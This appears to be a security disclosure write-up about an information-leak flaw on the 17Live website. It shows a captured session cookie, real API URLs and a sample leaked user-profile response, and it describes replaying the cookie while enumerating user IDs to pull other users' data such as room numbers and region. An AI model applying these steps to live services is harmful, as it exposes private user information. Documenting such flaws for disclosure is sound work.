# About 17Live Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: __stripe_mid=23f6c489-683b-4271-93f2-01b901c117e3232316; csrftoken=d6YCcSd9CRQ2iSWhBgvtp7Vgo0wXcUUIHRwmrpB23VpsuI8xyQYfYNGHOIiPgwBJ
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: room number, location.

> Request method: GET, information can be obtained by traversing the constructed user ID, such as "be3cfbb8-b44c-437a-9ab9-bb8b43d057cc", "53d46477-67b1-45ea-b25a-55ab288a62bc"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params|
|---|---|---|
|bahamutee|https://wap-api.17app.co/api/v1/users/be3cfbb8-b44c-437a-9ab9-bb8b43d057cc/info|be3cfbb8-b44c-437a-9ab9-bb8b43d057cc|
|shion.yg|https://wap-api.17app.co/api/v1/users/53d46477-67b1-45ea-b25a-55ab288a62bc/info|53d46477-67b1-45ea-b25a-55ab288a62bc|


### Leaked packet cases 
``` {
"userID": "be3cfbb8-b44c-437a-9ab9-bb8b43d057cc",
"openID": "shion.yg",
"displayName": "shion.yg",
"name": "",
"bio": "",
"picture": "",
"followerCount": 0,
"followingCount": 0,
"receivedLikeCount": 0,
"isFollowing": 0,
"isNotif": 0,
"isBlocked": 0,
"followRequestTime": 0,
"roomID": ****2248,
"privacyMode": "open",
"level": 1,
"followPrivacyMode": 0,
"badgeInfo": [
{
"badgeID": "obs",
"badgeName": {
"key": "badge_support_obs_account"
},
"description": {
"key": "badge_support_obs_account"
},
"iconURL": "http://cdn.17app.co/b509416d-c234-4f03-a4a7-f13c24939aef.png",
"grayoutIconURL": "",
"isInternal": 2,
"type": 0,
"using": 0,
"currProgress": 0,
"isNew": false,
"receivingTimestamp": 0,
"endTime": 0,
"backgroundType": 0
}
],
"region": "**",
"enableShop": 0,
"lastLiveTimestamp": 0,
"lastLiveRegion": "",
"gloryroadMode": 0,
"lastUsedHashtags": [],
"risingInfo": {
"risingStarEnable": false,
"level": 0,
"levelUpReminder": false
},
"levelBadges": [],
"energyRank": 0,
"incentiveInfo": {
"featureEnabled": false
},
"commentShadowColor": "",
"isFreePrivateMsgEnabled": false
}
```